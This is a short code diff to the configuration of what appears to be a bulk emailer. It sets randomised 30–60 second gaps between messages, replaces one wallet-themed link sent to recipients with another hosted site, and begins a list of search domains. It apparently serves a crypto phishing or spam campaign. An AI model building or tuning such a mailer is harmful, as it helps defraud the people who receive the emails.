@@ -293,7 +293,7 @@ const CONFIG = {
 
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
-    "https://wallet-interact-1-5v.onrender.com",
+    "https://dainteractive-15v.vercel.app/",
   ],
   searchTlds: [
     '.com', '.org', '.net', '.io', '.co', '.ad', '.ae', '.af', '.ag', '.al',
